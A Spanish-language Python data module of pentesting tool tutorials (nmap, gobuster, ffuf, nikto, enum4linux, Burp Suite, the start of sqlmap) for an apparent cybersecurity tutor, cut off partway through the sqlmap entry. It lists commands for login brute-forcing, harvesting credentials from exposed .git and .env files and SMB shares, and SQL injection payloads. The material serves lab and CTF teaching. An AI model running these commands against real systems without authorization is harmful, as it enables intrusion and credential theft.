"""Tutoriales estructurados de herramientas para el Cybersecurity Tutor.

Filosofía: el mismo contrato que tools.py — Python puro, sin dependencias externas,
sin subprocess. El tutor usa el dict estructurado como base técnica verificada;
el LLM adapta el nivel, el ritmo y el contexto pedagógico a la conversación real.

Cobertura (25 herramientas):
    RECONOCIMIENTO : nmap, gobuster, ffuf, whatweb, nikto, enum4linux
    WEB ATTACKS    : burpsuite, sqlmap, wfuzz, dirb
    POST-EXPL LINUX: linpeas, pspy, gtfobins
    POST-EXPL WIN  : winpeas, mimikatz, bloodhound, rubeus
    AD / LATERAL   : crackmapexec, impacket, responder, evil-winrm
    C2 / PAYLOADS  : msfconsole, msfvenom
    CRACKING       : hashcat, john
"""

# ============================================================================
# DATOS INTERNOS — base técnica por herramienta
# ============================================================================

_TUTORIALS: dict = {
    # ────────────────────────────────────────────────────────────────────────
    # RECONOCIMIENTO
    # ────────────────────────────────────────────────────────────────────────
    "nmap": {
        "nombre": "Nmap — Network Mapper",
        "categoria": "Reconocimiento",
        "que_es": (
            "Nmap es el escáner de red estándar de facto en pentesting. "
            "Descubre hosts activos, puertos abiertos, servicios en ejecución "
            "y sus versiones. Incluye un motor de scripts (NSE) con más de 600 "
            "scripts para enumeración, detección de vulnerabilidades y brute force."
        ),
        "por_que_importa": (
            "Sin un reconocimiento correcto atacas a ciegas. Nmap define la "
            "superficie de ataque: qué servicios hay, en qué versión, y por "
            "dónde entrar. Es el primer paso en cualquier auditoría real o CTF."
        ),
        "instalacion": "Viene preinstalado en Kali/Parrot. En Debian: sudo apt install nmap",
        "conceptos_clave": [
            "Puerto TCP/UDP: canal de comunicación numerado (0-65535). Los 1024 primeros son 'well-known'.",
            "SYN scan (-sS): envía SYN, si recibe SYN-ACK el puerto está abierto, envía RST sin completar el handshake. Más sigiloso que -sT.",
            "Service detection (-sV): envía probes a cada servicio y compara las respuestas con una base de datos de firmas.",
            "NSE (Nmap Scripting Engine): scripts Lua que automatizan enumeración, detección de vulns y más.",
            "Timing (-T0 a -T5): controla la velocidad/agresividad del escaneo. -T4 es el estándar en labs.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Tu primer escaneo — ¿qué hay ahí?",
                "explicacion": "El escaneo inicial rápido con detección de versiones. Cubre los 1000 puertos más comunes.",
                "comando": "nmap -sV --open -T4 <IP> -oN initial.txt",
                "que_observar": "Servicios y versiones. ¿Hay HTTP? ¿SSH? ¿SMB? Cada servicio es una puerta potencial.",
                "pregunta_reflexion": "¿Por qué usamos --open en lugar de ver todos los resultados?",
            },
            {
                "paso": 2,
                "titulo": "Todos los puertos — no dejes nada fuera",
                "explicacion": "El paso más importante que los principiantes omiten. Los servicios en puertos no estándar son muy comunes en CTFs y entornos reales.",
                "comando": "nmap -p- --open -T4 <IP> -oN all_ports.txt",
                "que_observar": "¿Hay puertos que no aparecieron en el escaneo inicial? SSH en 2222, web en 8080, 9090, bases de datos en puertos extraños.",
                "pregunta_reflexion": "¿Por qué una app podría estar en el puerto 8080 en lugar del 80?",
            },
            {
                "paso": 3,
                "titulo": "Escaneo dirigido con scripts NSE",
                "explicacion": "Con los puertos ya conocidos, lanzamos -sC (scripts por defecto) y -sV (versiones exactas) solo en los puertos encontrados. Más rápido y más información.",
                "comando": "nmap -sC -sV -p <PUERTOS> <IP> -oN targeted.txt",
                "que_observar": "Versiones exactas (necesarias para buscar CVEs). Scripts NSE pueden revelar: usuarios, shares SMB, certificados TLS, métodos HTTP.",
                "pregunta_reflexion": "¿Qué diferencia hay entre la información de -sV del paso 1 y la de este escaneo?",
            },
            {
                "paso": 4,
                "titulo": "Scripts específicos por servicio",
                "explicacion": "NSE tiene scripts especializados por protocolo. Úsalos cuando un servicio de alto valor aparece.",
                "comando": "nmap --script=smb-vuln* -p 445 <IP>         # vulnerabilidades SMB\nnmap --script=http-enum,http-title -p 80,443 <IP>  # enum web\nnmap --script=ftp-anon -p 21 <IP>                  # FTP anónimo",
                "que_observar": "VULNERABLE: en el output de smb-vuln* = prioridad máxima. ftp-anon: Anonymous FTP login allowed = acceso sin credenciales.",
                "pregunta_reflexion": "¿Qué hace un script de categoría 'vuln' que no hace -sC?",
            },
            {
                "paso": 5,
                "titulo": "Guardar y documentar",
                "explicacion": "Siempre guardar el output. En real es evidencia del engagement. En labs te permite retomar sin repetir escaneos.",
                "comando": "nmap -sC -sV -p- <IP> -oA scan_completo   # guarda .nmap .xml .gnmap",
                "que_observar": "El fichero .xml puede importarse directamente en Metasploit con 'db_import'.",
                "pregunta_reflexion": "¿Por qué documentar durante el pentest y no solo al final?",
            },
        ],
        "errores_comunes": [
            "Hacer solo el escaneo de top-1000 y asumir que está todo — el error más caro en CTFs.",
            "Olvidar -oN y perder los resultados al cerrar la terminal.",
            "Usar -T5 en entornos reales — puede derribar servicios y viola el ROE.",
            "No ejecutar scripts NSE en servicios críticos como SMB o FTP.",
        ],
        "flags_esenciales": {
            "-sV": "Detección de versiones de servicios",
            "-sC": "Scripts NSE por defecto (equivale a --script=default)",
            "-p-": "Todos los puertos (0-65535)",
            "--open": "Solo mostrar puertos abiertos",
            "-T4": "Timing agresivo — bueno para labs",
            "-Pn": "Omitir ping previo (útil si ICMP está bloqueado)",
            "-oN/-oA": "Guardar output en fichero",
            "--script=": "Especificar scripts NSE concretos",
        },
        "recursos": [
            "man nmap — la documentación más completa disponible",
            "https://nmap.org/nsedoc/ — catálogo completo de scripts NSE",
            "https://book.hacktricks.xyz/network-services-pentesting — enumeración por servicio",
        ],
        "siguiente_paso_natural": "Con los puertos y servicios mapeados: si hay HTTP → web_enumeration. Si hay SMB → smb_enumeration. Siempre buscar versiones en searchsploit.",
    },
    "gobuster": {
        "nombre": "Gobuster — Directory/File Brute Forcer",
        "categoria": "Reconocimiento web",
        "que_es": (
            "Gobuster es una herramienta de fuerza bruta para descubrir directorios, "
            "ficheros, subdominios y virtual hosts en aplicaciones web. Funciona "
            "enviando peticiones HTTP para cada entrada de una wordlist y filtrando "
            "por código de respuesta."
        ),
        "por_que_importa": (
            "El análisis manual de una web solo revela lo que el desarrollador "
            "quiso mostrar. Gobuster descubre lo que está 'escondido': paneles de "
            "admin, backups de código, APIs no documentadas, ficheros de configuración "
            "con credenciales. En CTFs y en real, aquí se gana o se pierde."
        ),
        "instalacion": "Viene preinstalado en Kali/Parrot. En otros: go install github.com/OJ/gobuster/v3@latest",
        "conceptos_clave": [
            "Wordlist: lista de nombres de directorios/ficheros a probar. La calidad de la wordlist determina los resultados.",
            "Extensiones (-x): gobuster prueba cada entrada también con esas extensiones. .bak puede ser un backup con código fuente.",
            "Código de respuesta: 200=existe, 301/302=redirect, 403=existe pero denegado, 404=no existe.",
            "Threads (-t): peticiones en paralelo. Más threads = más rápido, más ruidoso.",
            "Virtual hosts: un servidor puede servir múltiples dominios según el header Host.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Primera pasada rápida — wordlist pequeña con extensiones",
                "explicacion": "common.txt (~4500 entradas) da resultados en 1-2 minutos. Las extensiones multiplican los hallazgos.",
                "comando": "gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 30 -o gobuster_common.txt",
                "que_observar": "Cualquier ruta con status 200, 301, 302. Presta especial atención a: admin, login, backup, .git, .env, upload.",
                "pregunta_reflexion": "¿Por qué incluimos .bak en las extensiones si nadie sirve ficheros .bak intencionalmente?",
            },
            {
                "paso": 2,
                "titulo": "Segunda pasada — wordlist media si la primera es escasa",
                "explicacion": "directory-list-2.3-medium.txt tiene ~220k entradas. Usar cuando el sitio parece tener muchas rutas o la primera pasada da poco.",
                "comando": "gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -o gobuster_medium.txt",
                "que_observar": "Rutas nuevas que no aparecieron en common.txt. APIs en /api/v1/, /api/v2/.",
                "pregunta_reflexion": "¿Cuándo merece la pena usar una wordlist de 2M entradas en lugar de 220k?",
            },
            {
                "paso": 3,
                "titulo": "Fuzzing recursivo en directorios encontrados",
                "explicacion": "Un directorio interesante puede tener subdirectorios igualmente interesantes. Gobuster no es recursivo por defecto.",
                "comando": "gobuster dir -u http://<IP>/api/ -w /usr/share/wordlists/dirb/common.txt -x json,php -t 20",
                "que_observar": "Endpoints de API, versiones (/v1/, /v2/), recursos específicos.",
                "pregunta_reflexion": "¿Qué extensiones usarías en una API REST versus una app PHP?",
            },
            {
                "paso": 4,
                "titulo": "Virtual hosts — cuando hay un dominio",
                "explicacion": "Las apps con dominio a menudo tienen subdominios separados: dev., admin., api., staging. Cada uno puede tener una superficie de ataque diferente.",
                "comando": "gobuster vhost -u http://<DOMINIO> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -o vhosts.txt",
                "que_observar": "Subdominios con tamaño de respuesta diferente al base — indica contenido distinto.",
                "pregunta_reflexion": "¿Por qué un subdominio 'dev.' suele ser más vulnerable que el principal?",
            },
            {
                "paso": 5,
                "titulo": "Investigar los hallazgos por orden de prioridad",
                "explicacion": "El orden importa: .git y .env son críticos, paneles de admin son altos, directorios generales son medios.",
                "comando": "# Si encuentras /.git/:\ngit-dumper http://<IP>/.git/ ./repo_dump\ncd repo_dump && git log --oneline\ngrep -r 'password\\|secret\\|key' . --include='*.py' --include='*.php'\n\n# Si encuentras /.env:\ncurl http://<IP>/.env",
                "que_observar": "En .git: commits con credenciales en el historial. En .env: DB_PASSWORD, API_KEY, SECRET_KEY.",
                "pregunta_reflexion": "¿Por qué un .git expuesto es peor que un directorio de admin sin contraseña?",
            },
        ],
        "errores_comunes": [
            "No usar extensiones — perder todos los ficheros .php, .bak, .txt.",
            "No guardar output con -o — tener que repetir el escaneo.",
            "Parar en la primera wordlist cuando no hay resultados obvios.",
            "No hacer fuzzing recursivo en rutas interesantes encontradas.",
            "Ignorar los 403 — existen, simplemente están restringidos (y hay técnicas de bypass).",
        ],
        "flags_esenciales": {
            "-u": "URL objetivo",
            "-w": "Wordlist",
            "-x": "Extensiones a probar (php,html,txt,bak,zip,xml)",
            "-t": "Threads concurrentes (30 es razonable)",
            "-o": "Guardar output en fichero",
            "-b": "Ignorar estos códigos de estado (ej: -b 403,404)",
            "-k": "Ignorar errores de certificado SSL",
            "-s": "Solo mostrar estos códigos (ej: -s 200,301,302)",
        },
        "recursos": [
            "https://github.com/OJ/gobuster — documentación oficial",
            "/usr/share/wordlists/ — wordlists disponibles en Kali",
            "/usr/share/seclists/ — colección ampliada (sudo apt install seclists)",
        ],
        "siguiente_paso_natural": "Con rutas encontradas: investigar paneles de admin (credenciales por defecto, SQLi), ficheros de backup (credenciales en código), APIs (IDOR, endpoints sin auth).",
    },
    "ffuf": {
        "nombre": "Ffuf — Fuzz Faster U Fool",
        "categoria": "Reconocimiento web / Fuzzing avanzado",
        "que_es": (
            "Ffuf es una herramienta de fuzzing web más flexible que gobuster. "
            "El placeholder FUZZ puede colocarse en cualquier parte de la petición: "
            "URL, headers, parámetros GET/POST, cookies. Esto lo hace ideal para "
            "descubrir parámetros ocultos, hacer brute force de logins, y encontrar "
            "virtual hosts, además de directorios."
        ),
        "por_que_importa": (
            "Gobuster es más simple para directorios. Ffuf es más potente cuando "
            "necesitas fuzzear algo que no es una ruta: parámetros GET, campos POST, "
            "headers, o cuando quieres filtros más granulares para reducir el ruido."
        ),
        "instalacion": "Preinstalado en Kali. En otros: go install github.com/ffuf/ffuf/v2@latest",
        "conceptos_clave": [
            "FUZZ: el marcador que ffuf reemplaza con cada entrada de la wordlist. Puede estar en cualquier parte de la petición.",
            "Filtros: la clave para reducir falsos positivos. -fc (código), -fs (tamaño), -fw (palabras), -fl (líneas).",
            "Múltiples wordlists: ffuf acepta FUZZ, W2, W3... para fuzzing simultáneo de múltiples posiciones.",
            "Modo recursivo: -recursion para seguir subdirectorios automáticamente.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Fuzzing básico de directorios",
                "explicacion": "Equivalente a gobuster dir, pero con más opciones de filtrado.",
                "comando": "ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -c",
                "que_observar": "Respuestas con status 200, 301, 302. La columna 'Size' es útil para detectar páginas de error disfrazadas de 200.",
                "pregunta_reflexion": "¿Cómo distingues un 200 real de un 200 que es en realidad la página de error de la app?",
            },
            {
                "paso": 2,
                "titulo": "Filtrar por tamaño — reducir el ruido",
                "explicacion": "Muchas apps devuelven 200 para todo con el mismo tamaño (la página de 'no encontrado'). -fs elimina esas respuestas.",
                "comando": "# Primero hacer una petición a una ruta que no existe para ver el tamaño base:\ncurl -s http://<IP>/aaaaaaaa | wc -c\n# Luego filtrar ese tamaño:\nffuf -u http://<IP>/FUZZ -w wordlist.txt -c -fs <TAMAÑO_BASE>",
                "que_observar": "Con el filtro aplicado, solo quedan respuestas genuinamente diferentes.",
                "pregunta_reflexion": "¿Por qué es más preciso filtrar por tamaño que por código de estado?",
            },
            {
                "paso": 3,
                "titulo": "Fuzzing de parámetros GET — descubrir parámetros ocultos",
                "explicacion": "Las apps a menudo tienen parámetros no documentados que aceptan input. Este uso es exclusivo de ffuf.",
                "comando": "ffuf -u 'http://<IP>/page.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -c -fs <SIZE_SIN_PARAM>",
                "que_observar": "Parámetros que producen una respuesta diferente al baseline — pueden ser vectores de LFI, SQLi, SSRF.",
                "pregunta_reflexion": "Encuentras el parámetro 'file' — ¿qué atacarías primero?",
            },
            {
                "paso": 4,
                "titulo": "Brute force de login con POST",
                "explicacion": "Ffuf puede fuzzear el body de peticiones POST, útil para brute force de formularios de login.",
                "comando": "ffuf -u http://<IP>/login -X POST -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt -fc 302 -c",
                "que_observar": "La respuesta exitosa suele tener un código diferente (302 redirect) o un tamaño distinto.",
                "pregunta_reflexion": "¿Cómo sabrías si el login correcto hace redirect o devuelve 200 con un mensaje?",
            },
            {
                "paso": 5,
                "titulo": "Virtual hosts — con header Host",
                "explicacion": "Colocar FUZZ en el header Host permite descubrir subdominios sin necesidad de DNS.",
                "comando": "ffuf -u http://<IP> -H 'Host: FUZZ.<DOMINIO>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -fs <SIZE_BASE>",
                "que_observar": "Respuestas con tamaño diferente al baseline del dominio principal.",
                "pregunta_reflexion": "¿Qué diferencia un vhost discovery de un DNS subdomain enumeration?",
            },
        ],
        "errores_comunes": [
            "No establecer un filtro de tamaño base — resultados llenos de falsos positivos.",
            "Olvidar -c (colorear output) — dificulta leer los resultados.",
            "No probar extensiones cuando fuzzeando directorios (-e .php,.txt,.bak).",
            "Usar rockyou.txt directamente en brute force web sin limitar rate — puede bloquear la IP.",
        ],
        "flags_esenciales": {
            "-u": "URL con FUZZ como marcador",
            "-w": "Wordlist (múltiples: -w lista1 -w lista2:W2)",
            "-c": "Colorear output",
            "-fc": "Filtrar por código HTTP",
            "-fs": "Filtrar por tamaño de respuesta",
            "-fw/-fl": "Filtrar por palabras/líneas",
            "-X": "Método HTTP (GET, POST, PUT...)",
            "-d": "Body de la petición (para POST)",
            "-H": "Header personalizado",
            "-e": "Extensiones a añadir",
            "-rate": "Límite de peticiones por segundo",
            "-recursion": "Modo recursivo",
        },
        "recursos": [
            "https://github.com/ffuf/ffuf — documentación y ejemplos",
            "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/ffuf — casos de uso avanzados",
        ],
        "siguiente_paso_natural": "Parámetros descubiertos → probar LFI, SQLi, SSRF según el contexto. Login fuzzeado → continuar con las credenciales encontradas.",
    },
    "whatweb": {
        "nombre": "WhatWeb — Identificación de tecnologías web",
        "categoria": "Reconocimiento web",
        "que_es": (
            "WhatWeb identifica tecnologías web: CMS (WordPress, Drupal, Joomla), "
            "frameworks (Laravel, Django), servidores web, versiones de librerías, "
            "plugins activos y mucho más. Analiza headers HTTP, cookies, código HTML "
            "y patrones de respuesta."
        ),
        "por_que_importa": (
            "Saber que estás ante un WordPress 5.8 o un Apache 2.4.49 define "
            "completamente la estrategia de ataque. Sin identificar la tecnología, "
            "estás probando vectores al azar."
        ),
        "instalacion": "Preinstalado en Kali. En otros: sudo apt install whatweb",
        "conceptos_clave": [
            "Plugin: WhatWeb usa plugins para cada tecnología. Puedes crear los tuyos.",
            "Aggression level: -a 1 (pasivo) hasta -a 4 (agresivo, puede crear logs en el servidor).",
            "Output formats: texto, JSON, XML para integración con otras herramientas.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Identificación básica",
                "explicacion": "Una línea que da el resumen más importante: servidor, CMS, versiones detectadas.",
                "comando": "whatweb -v http://<IP>",
                "que_observar": "CMS detectado (WordPress → wpscan, Drupal → CHANGELOG.txt, Joomla → /administrator). Versión del servidor web. Frameworks PHP/Python/Ruby.",
                "pregunta_reflexion": "WhatWeb detecta 'WordPress 5.8' — ¿cuál es tu siguiente herramienta?",
            },
            {
                "paso": 2,
                "titulo": "Combinarlo con curl para headers completos",
                "explicacion": "WhatWeb puede perderse algunas cosas. curl -I o curl -sv muestra los headers HTTP raw.",
                "comando": "curl -sv http://<IP> 2>&1 | grep -iE 'server:|x-powered-by:|set-cookie:|location:'",
                "que_observar": "Server: puede revelar versión exacta. X-Powered-By: puede revelar PHP version. Set-Cookie: revela el nombre del framework de sesión.",
                "pregunta_reflexion": "¿Por qué un servidor bien configurado no debería mostrar su versión en el header Server?",
            },
        ],
        "errores_comunes": [
            "Depender solo de WhatWeb — siempre validar manualmente con curl y el browser.",
            "No revisar el código fuente de la página (Ctrl+U) — los comentarios HTML a veces dicen más que cualquier herramienta.",
        ],
        "flags_esenciales": {
            "-v": "Verbose — más detalle sobre cada plugin que coincide",
            "-a 3": "Nivel de agresividad más común en labs",
            "--log-json=file": "Guardar output en JSON",
        },
        "recursos": [
            "https://github.com/urbanadventurer/WhatWeb",
        ],
        "siguiente_paso_natural": "CMS identificado → herramienta específica (wpscan, droopescan). Servidor identificado → searchsploit con versión. Sin CMS → gobuster para enumerar estructura.",
    },
    "nikto": {
        "nombre": "Nikto — Web Server Scanner",
        "categoria": "Reconocimiento web",
        "que_es": (
            "Nikto es un escáner web que busca misconfigurations, ficheros peligrosos "
            "expuestos, versiones obsoletas y cabeceras de seguridad ausentes. "
            "No es un fuzzer de directorios — es un escáner de vulnerabilidades "
            "conocidas en servidores web."
        ),
        "por_que_importa": (
            "Identifica problemas que gobuster no busca: falta de cabeceras de seguridad, "
            "métodos HTTP peligrosos habilitados (PUT, DELETE), phpinfo() expuesto, "
            "ficheros de backup accesibles por nombre conocido."
        ),
        "instalacion": "Preinstalado en Kali. En otros: sudo apt install nikto",
        "conceptos_clave": [
            "Es ruidoso — genera muchos logs en el servidor objetivo. No usar en entornos reales sin autorización explícita.",
            "Muchos falsos positivos — leer cada hallazgo críticamente.",
            "Los hallazgos clasificados como 'OSVDB' o con código de riesgo alto merecen investigación inmediata.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Escaneo básico",
                "explicacion": "El escaneo estándar contra el servidor. Puede tardar varios minutos.",
                "comando": "nikto -h http://<IP> -o nikto_output.txt",
                "que_observar": "Cabeceras ausentes (X-Frame-Options, X-XSS-Protection), ficheros interesantes (phpinfo.php, test.php), métodos HTTP habilitados (PUT, DELETE).",
                "pregunta_reflexion": "Nikto encuentra PUT habilitado en el servidor — ¿qué podrías hacer con eso?",
            },
            {
                "paso": 2,
                "titulo": "Con puerto específico o HTTPS",
                "explicacion": "Nikto necesita el puerto explícito si no es 80/443.",
                "comando": "nikto -h http://<IP> -p 8080\nnikto -h https://<IP> -ssl",
                "que_observar": "Mismos hallazgos pero en el servicio correcto.",
                "pregunta_reflexion": "¿Por qué es importante escanear todos los puertos web encontrados, no solo el 80?",
            },
        ],
        "errores_comunes": [
            "Confiar ciegamente en todos los hallazgos — Nikto tiene bastantes falsos positivos.",
            "Olvidar que es muy ruidoso — en entornos reales debe estar autorizado.",
            "Usarlo como único escáner web — complementar siempre con gobuster y revisión manual.",
        ],
        "flags_esenciales": {
            "-h": "Host objetivo",
            "-p": "Puerto",
            "-ssl": "Forzar HTTPS",
            "-o": "Guardar output",
            "-Tuning": "Seleccionar categorías de tests (1=info, 2=misconfig, etc.)",
        },
        "recursos": [
            "https://github.com/sullo/nikto",
            "man nikto",
        ],
        "siguiente_paso_natural": "Hallazgos de Nikto → investigar cada uno manualmente con curl o Burp. PUT habilitado → intentar subir webshell. phpinfo() → extraer configuración del servidor.",
    },
    "enum4linux": {
        "nombre": "Enum4linux — Enumeración SMB/Samba",
        "categoria": "Reconocimiento / Enumeración SMB",
        "que_es": (
            "Enum4linux es una herramienta para enumerar información de sistemas "
            "Windows y Samba a través de SMB: usuarios, grupos, shares, políticas "
            "de contraseñas, información del dominio. Internamente usa smbclient, "
            "rpcclient, net y nmblookup."
        ),
        "por_que_importa": (
            "SMB expuesto suele ser una mina de información. La lista de usuarios "
            "del sistema es munición directa para ataques posteriores: brute force SSH, "
            "password spray, Kerberoasting. Los shares pueden contener credenciales en texto claro."
        ),
        "instalacion": "Preinstalado en Kali. enum4linux-ng (la versión moderna): pip install enum4linux-ng",
        "conceptos_clave": [
            "Null session: autenticación vacía a SMB. En sistemas mal configurados permite enumerar sin credenciales.",
            "RPC: protocolo que usa enum4linux para consultar información del sistema. Requiere acceso a los puertos 139/445.",
            "Shares: directorios compartidos por SMB. Pueden tener permisos de lectura pública.",
            "Password policy: si hay lockout, el brute force debe ser muy cauteloso.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Enumeración completa con -a",
                "explicacion": "-a ejecuta todas las comprobaciones: shares, usuarios, grupos, política de contraseñas, info de OS.",
                "comando": "enum4linux -a <IP> 2>&1 | tee enum4linux_full.txt",
                "que_observar": "Lista de usuarios (guardar en users.txt), shares disponibles, política de contraseñas (lockout threshold).",
                "pregunta_reflexion": "Encuentras un lockout de 5 intentos — ¿cómo cambias tu estrategia de password spray?",
            },
            {
                "paso": 2,
                "titulo": "Acceder a shares encontrados",
                "explicacion": "Con la lista de shares, conectar a los accesibles sin credenciales.",
                "comando": "smbclient -L //<IP> -N                    # listar shares\nsmbclient //<IP>/<SHARE> -N               # conectar sin credenciales\n# Dentro de smbclient:\nls\nget <fichero>\nrecurse ON; prompt OFF; mget *            # descargar todo",
                "que_observar": "Ficheros .xml, .conf, .txt, scripts PowerShell/bash — frecuentemente contienen credenciales.",
                "pregunta_reflexion": "¿Por qué un admin guardaría credenciales en un share SMB?",
            },
            {
                "paso": 3,
                "titulo": "Con credenciales — más información",
                "explicacion": "Si has obtenido credenciales en otro vector, enum4linux puede revelar mucho más.",
                "comando": "enum4linux -a -u '<USER>' -p '<PASS>' <IP>",
                "que_observar": "Más usuarios, grupos privilegiados, más shares. Si hay dominio: estructura del AD.",
                "pregunta_reflexion": "¿Qué harías con una lista de 20 usuarios del dominio?",
            },
        ],
        "errores_comunes": [
            "No guardar con tee — el output de enum4linux es largo y se pierde en el scroll.",
            "No intentar acceso a todos los shares listados — incluso los que parecen vacíos.",
            "Ignorar la política de contraseñas antes de lanzar brute force.",
        ],
        "flags_esenciales": {
            "-a": "Todas las comprobaciones",
            "-U": "Solo usuarios",
            "-S": "Solo shares",
            "-P": "Solo política de contraseñas",
            "-u/-p": "Usuario y contraseña (si los tienes)",
        },
        "recursos": [
            "https://github.com/CiscoCXSecurity/enum4linux",
            "https://github.com/cddmp/enum4linux-ng — versión modernizada",
        ],
        "siguiente_paso_natural": "Usuarios encontrados → brute force SSH/SMB con hydra, password spray con crackmapexec. Shares con datos → buscar credenciales en ficheros. Dominio detectado → BloodHound si tienes credenciales.",
    },
    # ────────────────────────────────────────────────────────────────────────
    # WEB ATTACKS
    # ────────────────────────────────────────────────────────────────────────
    "burpsuite": {
        "nombre": "Burp Suite — Web Application Security Testing",
        "categoria": "Web attacks / Proxy",
        "que_es": (
            "Burp Suite es el proxy HTTP/HTTPS estándar en pentesting web. "
            "Intercepta el tráfico entre tu browser y la aplicación, permitiendo "
            "modificar peticiones en tiempo real. Incluye: Proxy, Repeater, Intruder, "
            "Scanner (Pro), Decoder y más."
        ),
        "por_que_importa": (
            "Todo el pentesting web serio pasa por Burp. Ver las peticiones HTTP raw "
            "revela parámetros ocultos, tokens de sesión, lógica de autenticación "
            "y vectores de inyección que ningún scanner automático detecta."
        ),
        "instalacion": "Preinstalado en Kali (Community Edition). Descargar de portswigger.net para versión actual.",
        "conceptos_clave": [
            "Proxy: intercepta el tráfico entre browser y servidor. Requiere configurar el browser para usarlo (127.0.0.1:8080).",
            "Repeater: reenvía peticiones modificadas manualmente. La herramienta más usada en labs.",
            "Intruder: automatiza peticiones con payloads de listas. Brute force, fuzzing de parámetros.",
            "Scope: define qué URLs intercepta Burp. Crítico para no interceptar tráfico irrelevante.",
            "CA Certificate: instalar el certificado de Burp en el browser para interceptar HTTPS.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Configurar el proxy",
                "explicacion": "Antes de usar Burp necesitas que el tráfico del browser pase por él.",
                "comando": "# En Kali con Firefox:\n# 1. Burp → Proxy → Options → confirmar que escucha en 127.0.0.1:8080\n# 2. Firefox → Preferences → Network → Manual proxy → HTTP: 127.0.0.1 Puerto: 8080\n# 3. Navegar a http://burpsuite → descargar CA cert → instalar en Firefox\n# Alternativa: usar FoxyProxy addon en Firefox",
                "que_observar": "Burp Proxy → HTTP history debe empezar a llenarse cuando navegas.",
                "pregunta_reflexion": "¿Por qué necesitamos instalar el certificado CA de Burp para interceptar HTTPS?",
            },
            {
                "paso": 2,
                "titulo": "Interceptar y modificar una petición",
                "explicacion": "El flujo básico: interceptar → modificar → enviar al Repeater para iterar.",
                "comando": "# 1. Proxy → Intercept → ON\n# 2. Hacer click/login en la app → petición aparece en Burp\n# 3. Click derecho → Send to Repeater\n# 4. Proxy → Intercept → Forward (para que la petición original llegue)\n# 5. En Repeater: modificar parámetros → Send → ver respuesta",
                "que_observar": "Parámetros en el body POST, cookies de sesión, tokens CSRF, headers de autorización.",
                "pregunta_reflexion": "¿Qué cambiarías en una petición de login para probar SQLi?",
            },
            {
                "paso": 3,
                "titulo": "Repeater — probar manualmente vulnerabilidades",
                "explicacion": "Repeater es donde se hace la mayor parte del trabajo manual. Permite iterar rápidamente sobre payloads.",
                "comando": "# En Repeater:\n# - Modificar parámetros: username=admin' OR 1=1--\n# - Añadir headers: X-Forwarded-For: 127.0.0.1\n# - Cambiar método: GET → POST\n# - Comparar respuestas entre peticiones normales y modificadas",
                "que_observar": "Diferencias en: longitud de respuesta, tiempo de respuesta, mensajes de error, datos devueltos.",
                "pregunta_reflexion": "La respuesta tarda 5 segundos con payload ' OR SLEEP(5)-- — ¿qué te dice eso?",
            },
            {
                "paso": 4,
                "titulo": "Intruder — automatizar payloads",
                "explicacion": "Intruder automatiza el envío de múltiples payloads. Útil para brute force y fuzzing de parámetros. (Nota: Community Edition tiene rate limiting.)",
                "comando": "# 1. Send to Intruder desde cualquier petición\n# 2. Positions → marcar el parámetro a fuzzear con §valor§\n# 3. Payloads → cargar una lista\n# 4. Start Attack\n# Tipos: Sniper (1 posición), Battering Ram (mismo valor en todas), Pitchfork (listas paralelas), Cluster Bomb (combinaciones)",
                "que_observar": "Respuestas con longitud/código diferente al resto = candidato a investigar.",
                "pregunta_reflexion": "¿Cuándo usarías Cluster Bomb en lugar de Sniper?",
            },
        ],
        "errores_comunes": [
            "No instalar el CA certificate → HTTPS no interceptado.",
            "Dejar Intercept ON y olvidarlo → todo el tráfico se bloquea.",
            "No definir Scope → capturar tráfico de Google/CDNs innecesariamente.",
            "No usar Repeater para iterar — hacer cambios directamente en Intercept es más lento.",
        ],
        "flags_esenciales": {
            "Proxy → Intercept": "Interceptar peticiones en tiempo real",
            "Repeater (Ctrl+R)": "Reenviar peticiones modificadas",
            "Intruder (Ctrl+I)": "Automatizar payloads",
            "Decoder (Ctrl+Shift+D)": "Codificar/decodificar URL, Base64, HTML",
            "Comparer": "Comparar dos respuestas para encontrar diferencias",
        },
        "recursos": [
            "https://portswigger.net/web-security — PortSwigger Web Security Academy (gratis, los mejores labs web)",
            "https://portswigger.net/burp/documentation",
        ],
        "siguiente_paso_natural": "Con Burp interceptando: probar SQLi en parámetros de login, IDOR cambiando IDs de usuario, SSRF en parámetros de URL, manipulación de tokens JWT.",
    },
    "sqlmap": {
        "nombre": "Sqlmap — Automatización de SQL Injection",
        "categoria": "Web attacks",
        "que_es": (
            "Sqlmap automatiza la detección y explotación de SQL injection. "
            "Detecta el tipo de inyección (error-based, blind, time-based, UNION), "
            "enumera bases de datos, tablas y columnas, y puede volcar datos o "
            "intentar obtener acceso al sistema operativo."
        ),
        "por_que_importa": (
            "La SQLi manual es lenta y propensa a errores. Sqlmap automatiza "
            "el proceso de enumeración una vez confirmada la vulnerabilidad. "
            "IMPORTANTE: primero confirmar SQLi manualmente con Burp, luego sqlmap."
        ),
        "instalacion": "Preinstalado en Kali. pip install sqlmap",
        "conceptos_clave": [
            "Técnicas: UNION-based (más rápida), error-based, boolean blind, time-based blind (más lenta, última opción).",
            "Level/Risk: controla la agresividad. Aumentar si no detecta nada con valores por defecto.",
            "Dump: extraer datos de tablas. --dump-all para todo (cuidado con bases de datos grandes).",
            "OS shell: --os-shell si el DB user tiene permisos FILE y el servidor ejecuta la DB con privilegios.",
        ],
        "flujo_aprendizaje": [
            {
                "paso": 1,
                "titulo": "Confirmar SQLi manualmente primero",
                "explicacion": "Sqlmap no debe ser la primera herramienta. Primero confirmar con Burp que el parámetro es vulnerable.",
